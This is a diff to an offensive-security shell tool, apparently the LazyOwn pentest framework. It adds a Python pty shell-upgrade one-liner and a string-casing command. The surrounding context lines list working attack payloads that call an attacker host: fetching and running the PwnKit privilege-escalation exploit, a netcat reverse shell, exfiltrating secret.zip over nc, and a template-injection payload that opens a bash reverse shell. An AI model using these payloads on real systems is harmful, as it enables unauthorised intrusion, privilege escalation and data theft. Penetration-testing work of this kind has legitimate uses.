@@ -5111,6 +5111,7 @@ class LazyOwnShell(Cmd):
             ("pwnkit", f"curl -o PwnKit http://{lhost}/PwnKit32 ; chmod +x ./PwnKit ; ./PwnKit"),
             ("Reverse Shell",f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc {lhost} {lport} >/tmp/f"),
             ("Get secret",f"nc -w 3 {lhost} {lport} < secret.zip"),
+            ("Python3 stable Shell","python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"),
             ("SqlPAD Inyection","""{{ process.mainModule.require('child_process').exec('/bin/bash -c \\'bash -i >& /dev/tcp/{lhost}/5555 0>&1\\'') }}""".replace("{lhost}", lhost)),
             ("locate httpd.conf files", "locate httpd.conf"),
             ("locate vhosts.conf files", "locate vhosts.conf"),
@@ -13277,7 +13278,34 @@ class LazyOwnShell(Cmd):
 
         print_msg(f"Executing command: {command}")
         os.system(command)
+        return
 
+    def do_transform(self, line):
+        """
+        Transforms the input string based on user-defined casing style.
+
+        This command asks the user for a casing style (e.g., lower, upper, camel, pascal)
+        and transforms the input string accordingly.
+
+        Parameters:
+            line (str): Input string to be transformed.
+        """
+        if not line:
+            print_error("You need to pass the string as an argument, e.g., transform foo")
+            return
+
+        casing_input = input("    [?] Enter casing style (lower/l, upper/u, camel/c, pascal/p): ").strip().lower()
+        if casing_input not in ['l', 'u', 'c', 'p']:
+            print_warn("Invalid casing style. Choose from: l, u, c, p.")
+            return
+
+        delimiter = detect_delimiter(line)
+        parts = handle(line)
+        transformed_str = transform(parts, delimiter, casing_input)
+
+        copy2clip(transformed_str)
+        print_msg(f"Transformed string: {transformed_str}")
+        return
 
 if __name__ == "__main__":
     p = LazyOwnShell()
